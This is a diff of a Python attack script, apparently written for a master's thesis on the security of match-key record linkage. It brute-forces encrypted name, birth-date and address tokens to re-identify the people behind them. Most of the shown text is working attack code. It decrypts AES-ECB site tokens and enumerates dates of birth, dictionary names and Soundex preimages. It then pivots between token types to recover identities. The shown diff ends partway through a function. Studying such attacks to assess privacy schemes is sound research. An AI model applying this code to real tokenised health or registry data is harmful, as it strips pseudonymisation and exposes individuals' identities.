@@ -1,4 +1,26 @@
 #!/usr/bin/env python3
+"""
+Token Escalation Attack Script (Dictionary Mode)
+Master Thesis: Record Linkage with Match Key Algorithms - Is it secure?
+Author: Babett Müller
+
+Description:
+    This script implements a "Dictionary Attack" on encrypted match key tokens.
+    It uses a reference dataset (e.g., Voter Registry or synthetic distribution) 
+    to re-identify tokens. The attack follows an "Escalation" (pivoting) strategy
+    depending on the chosen token paths.
+
+    Key Features:
+    - Support for both German ('de') and US ('us') address formats.
+    - Configurable "Top-N" dictionary size.
+    - Supports multiple token paths: T1, T2, T4, T7, T3, T9.
+    - No multiprocessing; single-threaded for easier debugging and tracing.
+
+Usage:
+    python3 old_approaches/mult_attack_no_multiprocessing.py --in encrypted_tokens.csv --out results.txt \
+        --site-key "KEY" (--master-salt "SALT") --columns "T1,T2,T4,T3,T9"
+"""
+
 import argparse
 import base64
 import csv
@@ -11,12 +33,11 @@ from Crypto.Cipher import AES
 import pandas as pd
 import time
 
-# =============================
-# Normalization / helpers
-# =============================
+# ==============================================================================
+# CONSTANTS & MAPPINGS
+# ==============================================================================
 
-# --- Maps for American Soundex (as used by jellyfish.soundex) ---
-# This map defines the code for each consonant.
+# American Soundex Encoding Map
 AM_CODE_MAP = {
     b'b': '1', b'p': '1', b'f': '1', b'v': '1',
     b'c': '2', b's': '2', b'g': '2', b'j': '2', b'k': '2', b'q': '2', b'x': '2', b'z': '2',
@@ -26,7 +47,7 @@ AM_CODE_MAP = {
     b'r': '6',
 }
 
-# This is the inverted map, used for generating preimages from a code.
+# Inverse Map (Digit -> Possible Letters) for Generator
 AM_INV_CODE_MAP = {
     '1': [b'b', b'p', b'f', b'v'],
     '2': [b'c', b's', b'g', b'j', b'k', b'q', b'x', b'z'],
@@ -35,30 +56,61 @@ AM_INV_CODE_MAP = {
     '5': [b'm', b'n'],
     '6': [b'r'],
 }
-
-# Letters that are "0-coded" (skipped) by American Soundex.
+# Letters that are dropped in Soundex (unless initial)
 AM_ZERO_CODE_B = [b'a', b'e', b'i', b'o', b'u', b'y', b'h', b'w']
 # -----------------------------------------------------------------
 
-# All lowercase alphabet bytes for suffix brute-forcing
+# Full Alphabet for Generator
 ALL_ALPHABET_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]
 
+# Global Counter for Hash Computations
 HASHES = 0
+
+# Token Separator
+SEP = b"|"
+
+# ==============================================================================
+# HELPER FUNCTIONS (NORMALIZATION & HASHING)
+# ==============================================================================
+
 def digest_and_count(h):
+    """
+    Finalizes the hash digest and increments the global hash counter.
+    Used to track computational cost of the attack.
+    """
     global HASHES
     HASHES += 1
     return h.digest()
 
+def to_bytes_list(xs):
+    """
+    Converts a list of strings to a list of normalized UTF-8 encoded byte strings,
+    filtering out empty or whitespace-only strings.
+    """
+    return [norm(x).encode("utf-8") for x in xs if str(x).strip()]
+
 def norm(s: Any) -> str:
+    """
+    Normalizes a string by removing non-alphanumeric characters, whitespace,
+    and converting to lowercase.
+    Example: "O'Connor" -> "oconnor"
+    """
     return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())
 
 def norm_gender(g: Any) -> str:
+    """
+    Standardizes gender/sex input to 'm', 'f', or 'u'.
+    """
     g = str(g or "").strip().lower()
     if g in ("m", "male"): return "m"
     if g in ("f", "female"): return "f"
     return "u"
 
 def norm_dob(s: Any) -> str:
+    """
+    Parses various date string formats and standardizes them to 'YYYYMMDD'.
+    Example: "1990-01-01" -> "19900101"
+    """
     s = str(s or "").strip()
     fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
     for f in fmts:
@@ -71,54 +123,43 @@ def norm_dob(s: Any) -> str:
     return ""
 
 def first_initial(fn: str) -> str:
+    """
+    Extracts the first character from a first name.
+    """
     n = norm(fn)
     return n[0] if n else ""
 
 def first3(fn: str) -> str:
+    """
+    Extracts the first three characters from a first name.
+    """
     n = norm(fn)
     return n[:3] if n else ""
 
-def split_address(address, lang: str):
-    """
-    Split address into street and number using simple string operations instead of regex.
-    For German ('de'): street name first, then number.
-    For US ('us'): number first, then street name.
-    """
-    address = str(address).strip()
-    if not address:
-        return ""
-    parts = address.split()
-    if lang == "de":
-        for i, part in enumerate(parts):
-            if part and part[0].isdigit():
-                street = " ".join(parts[:i]).strip()
-                number = " ".join(parts[i:]).strip()
-                return street.strip().replace("-", "").replace(" ", "")
-        return " ".join(parts).strip().replace("-", "").replace(" ", "")
-    elif lang == "us":
-        if parts and parts[0].isdigit():
-            number = parts[0]
-            street = " ".join(parts[1:]).strip()
-        else:
-            street = " ".join(parts).strip()
-        return street.strip().replace("-", "").replace(" ", "")
-    return address.strip().replace("-", "").replace(" ", "")
-
 def split_address_b(address: str, lang: str) -> Tuple[bytes, bytes]:
+    """
+    Splits a raw address string into street name and house number.
+    Handles German (Street Number) and US (Number Street) formats differently.
+    
+    Returns:
+        (street_bytes, number_bytes)
+    """
     s = (address or "").strip()
     if not s: return b"", b""
-    # normalize dash/space, alnum only
+
+    # Clean and tokenize
     parts = s.replace("-", " ").split()
     chunks = ["".join(ch for ch in p.lower() if ch.isalnum()) for p in parts if p]
     if not chunks: return b"", b""
 
+    # US Format: "123 Main St" -> Number first
     if lang == "us":
-        # "123 main st" → number first
         if chunks[0] and chunks[0][0].isdigit():
             number = chunks[0].encode()
             street = "".join(chunks[1:]).encode()
             return street, number
-    # de or fallback: street then number at first digit-start
+        
+    # Default / German Format: "Hauptstrasse 123" -> Number last/middle
     num_idx = None
     for i, p in enumerate(chunks):
         if p and p[0].isdigit():
@@ -129,25 +170,33 @@ def split_address_b(address: str, lang: str) -> Tuple[bytes, bytes]:
     number = "".join(chunks[num_idx:]).encode()
     return street, number
 
-# =============================
-# Improve computation speed
-# =============================
-TOP_FIRST: list = []
-TOP_LAST: list = []
-TOP_ADDRESS: list = []
-SEX = ["m","f","u"]
-SEX_B = [b"m", b"f", b"u"]
-SEP = b"|"
-INITIALS_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]
+def make_init_hasher(master_salt: bytes | None):
+    """
+    Factory function that returns a hasher object.
+    - If salt is provided: Uses HMAC-SHA256.
+    - If salt is None: Uses SHA-256.
+    """
+    if master_salt is None:
+        def init_hasher(prefix=b""):
+            h = hashlib.sha256()
+            if prefix: h.update(prefix)
+            return h
+    else:
+        def init_hasher(prefix=b""):
+            return hmac.new(master_salt, prefix, hashlib.sha256)
+    return init_hasher
 
-def to_bytes_list(xs):  # normalize+encode once
-    return [norm(x).encode("utf-8") for x in xs if str(x).strip()]
+# ==============================================================================
+# PRECOMPUTATION FUNCTIONS
+# ==============================================================================
 
 def precompute_dobs(min_year, max_year):
-    # Returns e.g. [b"19841203", ...] already bytes
+    """
+    Generates a list of all valid dates (YYYYMMDD) within the given year range.
+    Optimization: Pre-encodes them to bytes to save time in the inner loop.
+    """
     dobs = []
     for y in range(min_year, max_year + 1):
-        # simple leap-year check
         leap = (y % 4 == 0) and (y % 100 != 0 or y % 400 == 0)
         mdays = (31, 29 if leap else 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31)
         for m, dmax in enumerate(mdays, 1):
@@ -155,25 +204,44 @@ def precompute_dobs(min_year, max_year):
                 dobs.append(f"{y:04d}{m:02d}{d:02d}".encode("utf-8"))
     return dobs
 
+def precompute_house_numbers(lang: str, max_de=500, max_us=500) -> list:
+    """
+    Generates a list of common house numbers to brute-force the address token (T9).
+    """
+    if lang == "de": return [f"{n}".encode("utf-8") for n in range(1, max_de+1)]
+    if lang == "us": return [f"{n}".encode("utf-8") for n in range(1, max_us+1)]
+    return []
+
 def build_soundex_maps(TOP_FIRST_B, TOP_LAST_B):
-    # soundex expects str; decode once here
+    """
+    Constructs Reverse Lookup Maps (Indices) for the Dictionary Attack.
+    These maps allow O(1) retrieval of candidate names based on their derived features.
+    
+    Returns:
+        FN_BY_INITIAL: Map 'J' -> ['John', 'James'...]
+        FN_BY_SDX:     Map 'J500' -> ['John', 'Jon'...]
+        LN_BY_SDX:     Map 'S530' -> ['Smith', 'Smyth'...]
+        SDX_LAST:      Sorted list of unique Last Name Soundexes
+        SDX_FIRST:     Sorted list of unique First Name Soundexes
+        ... (byte versions)
+    """
     FN_BY_INITIAL = defaultdict(list)
     FN_BY_SDX     = defaultdict(list)
     LN_BY_SDX     = defaultdict(list)
     sdx_last_set  = set()
     sdx_first_set = set()
     for ln_b in TOP_LAST_B:
-        if not ln_b:
-            continue
-        sdx_last = soundex(ln_b.decode("utf-8"))
+        if not ln_b: continue
+        try: sdx_last = soundex(ln_b.decode("utf-8"))
+        except: continue
         if sdx_last:
             sdx_last_set.add(sdx_last)
             LN_BY_SDX[sdx_last].append(ln_b)
     for fn_b in TOP_FIRST_B:
-        if not fn_b:
-            continue
+        if not fn_b: continue
         FN_BY_INITIAL[fn_b[:1]].append(fn_b)
-        sdx_fn = soundex(fn_b.decode("utf-8"))
+        try: sdx_fn = soundex(fn_b.decode("utf-8"))
+        except: continue
         if sdx_fn:
             sdx_first_set.add(sdx_fn)
             FN_BY_SDX[sdx_fn].append(fn_b)
@@ -183,91 +251,62 @@ def build_soundex_maps(TOP_FIRST_B, TOP_LAST_B):
     SDX_FIRST_B = [c.encode("utf-8") for c in SDX_FIRST]
     return FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B
 
-def make_init_hasher(master_salt: bytes | None):
-    if master_salt is None:
-        def init_hasher(prefix=b""):
-            h = hashlib.sha256()
-            if prefix:
-                h.update(prefix)
-            return h
-    else:
-        def init_hasher(prefix=b""):
-            return hmac.new(master_salt, prefix, hashlib.sha256)
-    return init_hasher
-
-ZIP3_PARTS = [f"{z:03d}".encode("utf-8") for z in range(1000)]
-
-def precompute_house_numbers(lang: str, max_de=500, max_us=1000):
-    # returns list of number bytes WITHOUT separators, to be concatenated as needed
-    if lang == "de":
-        return [f"{n}".encode("utf-8") for n in range(1, max_de+1)]
-    elif lang == "us":
-        return [f"{n}".encode("utf-8") for n in range(1, max_us+1)]
-    else:
-        return []
-    
 def build_first3_map(first_names_b):
-    from collections import defaultdict
+    """
+    Builds a map for the T7 Pivot: First 3 Letters -> Full Names.
+    Example: b'mar' -> [b'mary', b'martin', b'mark'...]
+    """
     m = defaultdict(list)
     for fn in first_names_b:
-        if not fn:
-            continue
-        m[fn[:3]].append(fn)
+        if fn: m[fn[:3]].append(fn)
     return m
-    
-def precompute_all_soundex_codes() -> Tuple[Set[bytes], Set[bytes]]:
-    """Generates all possible 4-character American Soundex codes (LCCC)."""
-    initials = [bytes([c]) for c in range(ord('a'), ord('z') + 1)]
-    # American Soundex uses digits 1-6
-    digits = [bytes([c]) for c in b'123456']
-    
-    all_sdx_ln = set()
-    all_sdx_fn = set()
 
+def precompute_all_soundex_codes() -> Tuple[Set[bytes], Set[bytes]]:
+    """
+    Generates the theoretical set of ALL valid American Soundex codes (Letter + 3 Digits).
+    Used for the Brute-Force Entry on T2 when no dictionary is available.
+    """
+    initials = [bytes([c]) for c in range(ord('a'), ord('z') + 1)]
+    digits = [bytes([c]) for c in b'123456']
+    all_sdx_ln, all_sdx_fn = set(), set()
     for initial in initials:
         sdx_prefix = initial.decode().upper().encode()
-
-        # Generate all 3-digit combinations
+        all_sdx_ln.add(sdx_prefix + b'000')
+        all_sdx_fn.add(sdx_prefix + b'000')
         for d1 in digits:
+            all_sdx_ln.add(sdx_prefix + d1 + b'00')
+            all_sdx_fn.add(sdx_prefix + d1 + b'00')
             for d2 in digits:
+                all_sdx_ln.add(sdx_prefix + d1 + d2 + b'0')
+                all_sdx_fn.add(sdx_prefix + d1 + d2 + b'0')
                 for d3 in digits:
                     sdx_code = sdx_prefix + d1 + d2 + d3
                     all_sdx_ln.add(sdx_code)
                     all_sdx_fn.add(sdx_code)
-        
-        # Also handle 0-padding
-        all_sdx_ln.add(sdx_prefix + b'000')
-        all_sdx_fn.add(sdx_prefix + b'000')
-        for d1 in digits:
-             all_sdx_ln.add(sdx_prefix + d1 + b'00')
-             all_sdx_fn.add(sdx_prefix + d1 + b'00')
-             for d2 in digits:
-                 all_sdx_ln.add(sdx_prefix + d1 + d2 + b'0')
-                 all_sdx_fn.add(sdx_prefix + d1 + d2 + b'0')
-
     return all_sdx_ln, all_sdx_fn
 
 def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[bytes]:
     """
-    Generates all name strings (up to max_length) that match the
-    American Soundex code.
+    Recursive Generator (Brute-Force Engine).
     
-    Includes heuristic: max 2 consecutive 0-coded letters.
-    Includes suffix: once digits are consumed, switches to full-alphabet
-    brute-force for the rest of the name up to max_length.
+    Reverses the Soundex algorithm to generate all possible name strings that map
+    to a given Soundex code. Generates all name strings (up to max_length) that match the
+    American Soundex code. Only yields "complete" names.
+    This version removes memoization to prevent memory crashes.
+    
+    Args:
+        soundex_code: Target code (e.g., "S530")
+        max_length: Maximum length of generated names.
+        
+    Yields:
+        Byte strings of candidate names (e.g., b"smith", b"smyth").
     """
     if not soundex_code or not soundex_code[0].isalpha() or len(soundex_code) != 4:
         return
-        
     initial_char_b = soundex_code[0].lower().encode()
-    # Get the code for the first letter (e.g., 'l' -> '4')
     initial_code = AM_CODE_MAP.get(initial_char_b)
-    
-    # Digits to match, ignoring '0' padding
     digits_to_match = soundex_code[1:].replace('0', '')
-    
-    # Memoization to avoid re-exploring the same state
-    memo = set()
+    # memo = set()  
 
     def _generate(
         current_name_b: bytes,
@@ -276,42 +315,22 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
         consecutive_zeros: int,
         in_suffix_mode: bool
     ):
-        """
-        Recursive helper to generate preimages.
-        
-        :param current_name_b: The name prefix built so far (e.g., b'maxi')
-        :param last_code_seen: The last Soundex code *added* (e.g., '2')
-        :param remaining_digits: Digits we still need to match (e.g., '5')
-        :param consecutive_zeros: Count of 0-coded letters in a row
-        :param in_suffix_mode: If True, switch to full alphabet brute-force
-        """
-        
-        state = (current_name_b, last_code_seen, remaining_digits, consecutive_zeros, in_suffix_mode)
-        if state in memo:
-            return
-        memo.add(state)
+        # state = (current_name_b, ...)  
+        # if state in memo: return       
+        # memo.add(state)                
 
-        # 1. Base Case: Yield the current name
-        # We yield at every step, as a prefix might be a valid name
-        yield current_name_b
-        
-        # 2. Stop condition: Max length reached
+        # 1. Suffix Mode: Digits matched, append arbitrary letters up to max_length
+        if in_suffix_mode:
+            yield current_name_b
         if len(current_name_b) >= max_length:
             return
-        
-        # --- Suffix Mode ---
-        # If we are in suffix mode, just brute-force all letters
         if in_suffix_mode:
             for char_b in ALL_ALPHABET_B:
                 if len(current_name_b) + len(char_b) <= max_length:
                     yield from _generate(current_name_b + char_b, None, "", 0, True)
             return
         
-        # --- Soundex-Constrained Mode ---
-
-        # 3. Try appending a 0-coded letter (a, e, i, o, u, y, h, w)
-        # This *never* consumes a digit and *never* changes last_code_seen
-        # Heuristic: limit to 2 in a row
+        # 2. Try appending vowels/separators (Zero Code)
         if consecutive_zeros < 2:
             for char_b in AM_ZERO_CODE_B:
                 if len(current_name_b) + len(char_b) <= max_length:
@@ -322,10 +341,8 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
                         consecutive_zeros + 1,
                         False
                     )
-        
-        # 4. Try appending a "same-code" consonant
-        # e.g., if last_code_seen was '1' (from 'b'), we can add 'p', 'f', 'v'
-        # This *does not* consume a digit.
+
+        # 3. Try appending adjacent consonants (Same Code rule)
         if last_code_seen:
             for char_b in AM_INV_CODE_MAP.get(last_code_seen, []):
                  if len(current_name_b) + len(char_b) <= max_length:
@@ -333,20 +350,16 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
                         current_name_b + char_b,
                         last_code_seen,
                         remaining_digits,
-                        0, # Resets zero counter
+                        0, 
                         False
                     )
 
+        # 4. Try appending new consonants (Next Digit)
         next_digit_to_match = remaining_digits[0] if remaining_digits else None
-        
-        # 5. Try appending a *new* Coded Consonant
         if next_digit_to_match:
-            # Get all letters that map to this digit (e.g., '1' -> [b'b', b'p', b'f', b'v'])
             for char_b in AM_INV_CODE_MAP.get(next_digit_to_match, []):
-                # American Soundex rule: only add code if different from previous
                 if next_digit_to_match != last_code_seen:
                     if len(current_name_b) + len(char_b) <= max_length:
-                        # Consume the digit, update last_code, reset zero counter
                         yield from _generate(
                             current_name_b + char_b,
                             next_digit_to_match,
@@ -354,127 +367,118 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
                             0,
                             False
                         )
-        
-        # 6. If no digits are left, transition to suffix mode
         else:
-            # All required digits are matched.
-            # We can now start the full-alphabet suffix brute-force.
+            # Digits exhausted -> Switch to Suffix Mode
+            if len(current_name_b) >= 1:
+                yield current_name_b
             for char_b in ALL_ALPHABET_B:
                  if len(current_name_b) + len(char_b) <= max_length:
-                    # The next state will be in suffix mode
                     yield from _generate(
                         current_name_b + char_b,
-                        None, # No more soundex codes
-                        "",   # No more digits
+                        None, 
+                        "",   
                         0,
-                        True  # Enter suffix mode
+                        True
                     )
-
-    # Initial call:
-    # Start with the fixed first letter
-    # The first "last_code_seen" is the code of the initial letter
     yield from _generate(initial_char_b, initial_code, digits_to_match, 0, False)
 
-# =============================
-# Master token functions
-# =============================
-def master_sha256(token_input: str) -> bytes:
-    h = hashlib.sha256()
-    h.update(token_input.encode("utf-8"))
-    return digest_and_count(h)
+# ==============================================================================
+# SITE DECRYPTION & LOADING
+# ==============================================================================
 
-def master_hmac(master_salt: bytes, token_input: str) -> bytes:
-    h = hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256)
-    return digest_and_count(h)
+def aes128_ecb_decrypt_b64(site_key_16: bytes, token_b64: str) -> bytes:
+    """
+    Decrypts a base64-encoded AES-128-ECB encrypted token to retrieve the
+    intermediate master token hash.
+    """
+    ct = base64.b64decode(token_b64)
+    if len(ct) % 16 != 0: raise ValueError("Ciphertext not multiple of AES block size.")
+    cipher = AES.new(site_key_16, AES.MODE_ECB)
+    pt = cipher.decrypt(ct)
+    return pt
+
+def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
+    """
+    Decrypts a Base64 encoded, AES-256-ECB encrypted site token to retrieve the
+    intermediate master token hash.
+    """
+    ct = base64.b64decode(token_b64)
+    if len(ct) % 16 != 0: raise ValueError("Ciphertext not multiple of AES block size.")
+    cipher = AES.new(site_key_32, AES.MODE_ECB)
+    pt = cipher.decrypt(ct)
+    return pt
 
 def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
-    """Accept hex or utf-8; optionally enforce expected length."""
-    try:
-        b = bytes.fromhex(s)
-    except ValueError:
-        b = s.encode("utf-8")
+    """
+    Helper to parse hex strings or UTF-8 strings into bytes.
+    """
+    try: b = bytes.fromhex(s)
+    except ValueError: b = s.encode("utf-8")
     if expect_len is not None and len(b) != expect_len:
         raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
     return b
 
-# =============================
-# Site encryption (AES-ECB)
-# =============================
-def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
-    """Decrypt base64-encoded site token to raw 32-byte master token."""
-    ct = base64.b64decode(token_b64)
-    if len(ct) % 16 != 0:
-        raise ValueError("Ciphertext is not a multiple of AES block size.")
-    cipher = AES.new(site_key_32, AES.MODE_ECB)  # AES-256 (32-byte key)
-    pt = cipher.decrypt(ct)
-    # Expect SHA-256 output length
-    if len(pt) != 32:
-        # Some pipelines might pack more; keep it but warn upstream if needed
-        pass
-    return pt
-
-# =============================
-# Token input builders
-# =============================
-def mk_T1(ln: str, fn: str, g: str, dob: str) -> str:
-    fi = first_initial(fn)
-    if not (ln and fi and g and dob): return ""
-    return f"{ln}|{fi}|{g}|{dob}"
-
-def mk_T2(ln: str, fn: str, g: str, dob: str) -> str:
-    sdx_ln = soundex(ln); sdx_fn = soundex(fn)
-    if not (sdx_ln and sdx_fn and g and dob): return ""
-    return f"{sdx_ln}|{sdx_fn}|{g}|{dob}"
-
-def mk_T4(ln: str, fn: str, g: str, dob: str) -> str:
-    if not (ln and fn and g and dob): return ""
-    return f"{ln}|{fn}|{g}|{dob}"
-
-def mk_T3(ln: str, fn: str, dob: str, zip3: str) -> str:
-    if not (ln and fn and dob and zip3): return ""
-    return f"{ln}|{fn}|{dob}|{zip3}"
-
-# =============================
-# Load and decrypt site tokens
-# =============================
 def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
+    """
+    Reads the CSV file containing the encrypted tokens.
+    """
     with open(path, newline="", encoding="utf-8") as f:
         r = csv.DictReader(f)
         rows = list(r)
     return {"_RAW": rows}
 
 def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
+    """
+    Iterates through the raw CSV rows and decrypts all tokens for the target columns.
+    Returns a Set of unique Master Tokens (hashes) for each column type (T1, T2...).
+    """
     out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
-    successes = 0
-    failures = 0
+    successes, failures = 0, 0
     for row in rows:
         for c in colnames:
             val = (row.get(c) or "").strip()
-            if not val:
-                continue
+            if not val: continue
             try:
                 mt = aes256_ecb_decrypt_b64(site_key_32, val)
                 out[c].add(mt)
                 successes += 1
-            except Exception:
-                failures += 1
-                # keep going
+            except Exception: failures += 1
     for c in colnames:
         print(f"[decrypt] {c}: unique master tokens={len(out[c])} (successes={successes}, failures={failures})")
     return out
 
-# =============================
-# Attack core
-# =============================
+def master_sha256(token_input: str) -> bytes:
+    """
+    Computes SHA-256 hash of the input string and returns the digest.
+    """
+    h = hashlib.sha256()
+    h.update(token_input.encode("utf-8"))
+    return digest_and_count(h)
 
-# Helper for calculating all birthdays for ages 18 to 80
-today = date.today()
-min_age = 18
-max_age = 80
-min_year = today.year - max_age
-max_year = today.year - min_age
+def master_hmac(master_salt: bytes, token_input: str) -> bytes:
+    """
+    Computes HMAC-SHA256 of the input string using the provided master salt.
+    """
+    h = hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256)
+    return digest_and_count(h)
+
+# ==============================================================================
+# ATTACK FUNCTIONS (CORE LOGIC)
+# ==============================================================================
+
+# ==============================================================================
+# ATTACK FUNCTIONS (CORE LOGIC)
+# ==============================================================================
 
 def attack_T1_fast(master_tokens, lastnames_b, initials_b, dobs_b, init_hasher):
+    """
+    Pivot:          Brute-force T1 (ln|fi|g|dob) directly from last names, initials and dobs.
+    Strategy:       Iterate through all combinations of last names, first initials, genders, and dobs.
+    Complexity:     O(LastNames * 26 * 3 * DOBs)
+    
+    Returns:
+        Map { master_token: (ln, fi, g, dob) }
+    """
     hits = {}
     for ln in lastnames_b:                  
         h_ln = init_hasher(ln + SEP)              # H(ln|)
@@ -491,8 +495,17 @@ def attack_T1_fast(master_tokens, lastnames_b, initials_b, dobs_b, init_hasher):
 
 def attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
     """
-    Use LN_BY_SDX and FN_BY_SDX to map soundex codes to candidate last/first names,
-    then test T1 candidates (ln|fi|g|dob) where fi = first initial of candidate first names.
+    Pivot:          Recover T1 (ln|fi|g|dob) candidates from a T2 hit (sdx_ln|sdx_fn|g|dob).
+    Strategy:       Use LN_BY_SDX (Dictionary) or a Soundex Generator to map the known 
+                    Last Name Soundex code back to candidate Last Name strings.
+                    Derive the First Initial (fi) directly from the first character of the 
+                    First Name Soundex (sdx_fn), as Soundex preserves the initial.
+                    Test the resulting T1 candidates.
+    Complexity:     O(Candidate_Last_Names)
+                    (Much faster than attack_T1_fast because we only check relevant names)
+    
+    Returns:
+        Map { master_token: (ln, fi, g, dob) }
     """
     hits = {}
     contains = master_tokens.__contains__
@@ -511,7 +524,7 @@ def attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, F
     if not cand_last_names:
         return hits
     for ln_b in cand_last_names:
-        h_ln = init_hasher(ln_b + SEP)                      # H(ln|)
+        h_ln = init_hasher(ln_b + SEP)                              # H(ln|)
         h_fi = h_ln.copy(); h_fi.update(fi_b); h_fi.update(SEP)        # H(ln|fi|)
         h_g  = h_fi.copy(); h_g.update(g_b); h_g.update(SEP)          # H(ln|fi|g|)
         h_final = h_g.copy(); h_final.update(dob_b)                 # H(ln|fi|g|dob)
@@ -521,6 +534,15 @@ def attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, F
     return hits
 
 def attack_T2_fast(master_tokens, SDX_LAST_B, SDX_FIRST_B, dobs_b, init_hasher):
+    """
+    Pivot:          Brute-force T2 (sdx_ln|sdx_fn|g|dob) by iterating Soundex codes.
+    Strategy:       Instead of iterating names, iterate the smaller space of Soundex codes 
+                    (derived from a dictionary or exhaustively generated).
+    Complexity:     O(Unique_Sdx_Last * Unique_Sdx_First * 3 * DOBs)
+    
+    Returns:
+        Map { master_token: (sdx_ln, sdx_fn, g, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     for sdx_ln in SDX_LAST_B:                       # b"X123"
@@ -538,8 +560,15 @@ def attack_T2_fast(master_tokens, SDX_LAST_B, SDX_FIRST_B, dobs_b, init_hasher):
 
 def attack_T2_via_T1(master_tokens, SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher):
     """
-    Optimized: use cached sdx(last) from last_to_sdx (bytes key -> str soundex) to avoid
-    per-iteration decode + soundex computation. Falls back to recomputing if absent.
+    Pivot:          Recover T2 candidates from a known T1 hit (ln|fi|g|dob).
+    Strategy:       We already know the exact Last Name (ln), so we compute its Soundex directly.
+                    We know the First Initial (fi), so we filter the candidate First Name 
+                    Soundex codes to only those starting with that initial.
+                    Test the resulting T2 candidates.
+    Complexity:     O(Candidate_First_Soundexes) -> Usually very small (< 100 codes per initial)
+    
+    Returns:
+        Map { master_token: (sdx_ln, sdx_fn, g, dob) }
     """
     hits = {}
     contains = master_tokens.__contains__
@@ -571,17 +600,14 @@ def attack_T2_via_T1(master_tokens, SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_s
 
 def attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher):
     """
-    Recover T7 (ln|fi3|g|dob) from a known T1 preimage (ln|fi|g|dob).
-
-    We know:
-      ln_b : last name (bytes)
-      fi_b : first initial (single lowercase letter, bytes)
-      g_b  : gender byte (b"m"/b"f"/b"u")
-      dob_b: b"YYYYMMDD"
-
-    Strategy:
-      Enumerate all possible 2nd and 3rd lowercase letters (a-z),
-      build fi3 = fi + l2 + l3, hash ln|fi3|g|dob and test membership.
+    Pivot:          Recover T7 (ln|fi3|g|dob) from a known T1 hit (ln|fi|g|dob).
+    Strategy:       We know the first initial (fi). T7 requires the first 3 letters (fi3).
+                    We brute-force the 2nd and 3rd letters (a-z) to generate all possible 
+                    3-letter prefixes starting with `fi`.
+    Complexity:     O(26 * 26) = O(676) per T1 hit.
+    
+    Returns:
+        Map { master_token: (ln, fi3, g, dob) }
     """
     hits = {}
     contains = master_tokens.__contains__
@@ -606,8 +632,15 @@ def attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher):
 
 def attack_T7_via_T2_T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher):
     """
-    Recover T7 (ln|fi3|g|dob) using T1 (ln|fi|g|dob) + T2's sdx(fn).
-    Uses first three actual letters of candidate first names (no padding).
+    Pivot:          Recover T7 (ln|fi3|g|dob) using intersection of T1 (provides ln) 
+                    and T2 (provides sdx_fn).
+    Strategy:       Use the First Name Soundex from T2 to lookup candidate First Names 
+                    in the dictionary (FN_BY_SDX). Extract their 3-letter prefixes (fi3) 
+                    and test them with the known Last Name from T1.
+    Complexity:     O(Candidate_First_Names_for_Soundex)
+    
+    Returns:
+        Map { master_token: (ln, fi3, g, dob) }
     """
     hits = {}
     contains = master_tokens.__contains__
@@ -633,8 +666,14 @@ def attack_T7_via_T2_T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, in
 
 def attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
     """
-    Recover T7 (ln|fi3|g|dob) from T2 (sdx(ln)|sdx(fn)|g|dob) using first three actual letters (no padding).
-    Brute-forces all names consistent with the Soundex codes.
+    Pivot:          Recover T7 (ln|fi3|g|dob) purely from T2 (sdx_ln|sdx_fn|g|dob).
+    Strategy:       Brute-force/Generate all candidate Last Names from `sdx_ln`.
+                    Brute-force/Generate all candidate First Names from `sdx_fn` (length 3).
+                    Test the Cartesian product of these candidates against T7.
+    Complexity:     O(Cand_Last_Names * Cand_First_Name_Prefixes)
+    
+    Returns:
+        Map { master_token: (ln, fi3, g, dob) }
     """
     hits = {}
     contains = master_tokens.__contains__
@@ -671,8 +710,14 @@ def attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher)
 
 def attack_T7_via_T2T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
     """
-    Recover T7 (ln|fi3|g|dob) from T2 (sdx(ln)|sdx(fn)|g|dob) and T1 (ln|fi|g|dob) using first three actual letters (no padding).
-    Brute-forces all names consistent with the Soundex codes.
+    Pivot:          Recover T7 (ln|fi3|g|dob) from intersection of T1 (provides ln) and T2 (provides sdx_fn).
+    Strategy:       Similar to attack_T7_via_T2, but we skip generating Last Names because
+                    we already know `ln` from T1. We only generate First Name prefixes 
+                    consistent with `sdx_fn`.
+    Complexity:     O(Cand_First_Name_Prefixes)
+    
+    Returns:
+        Map { master_token: (ln, fi3, g, dob) }
     """
     hits = {}
